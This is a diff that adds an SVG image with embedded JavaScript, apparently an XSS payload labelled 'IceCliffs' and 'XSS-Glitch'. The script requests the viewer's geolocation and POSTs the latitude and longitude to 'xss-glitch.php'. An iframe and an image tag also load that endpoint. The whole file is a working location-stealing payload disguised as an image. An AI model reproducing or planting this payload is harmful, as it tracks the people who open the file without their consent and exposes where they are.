@@ -1,0 +1,27 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 45 45">
+    <script type="text/javascript">
+        console.log(".___             _________ .__  .__  _____  _____");
+        console.log("|   | ____  ____ \\_   ___ \\|  | |__|/ ____\\/ ____\\______");
+        console.log("|   |/ ___\\/ __ \\/    \\  \\/|  | |  \\   __\\\\   __\\/  ___/");
+        console.log("|   \\  \\__\\  ___/\\     \\___|  |_|  ||  |   |  |  \\___ \\");
+        console.log("|___|\\___  >___  >\\______  /____/__||__|   |__| /____  >");
+        console.log("         \\/    \\/        \\/                          \\/");
+        console.log("[IceCliffs] Start GPS");
+        (function() {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                var latitude = position.coords.latitude;
+                var longitude = position.coords.longitude;
+                console.log("[XSS-Glitch] Latitude  : " + latitude);
+                console.log("[XSS-Glitch] Longitude : " + longitude);
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "xss-glitch.php", true);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                var data = "Latitude = " + position.coords.latitude + " Longitude = " + position.coords.longitude;
+                console.log("[XSS-Glitch] GPS DATA: " + data);
+                xhr.send(data);
+            });
+        })();
+    </script>
+    <iframe src="xss-glitch.php"></iframe>
+    <img src="xss-glitch.php" />
+</svg>
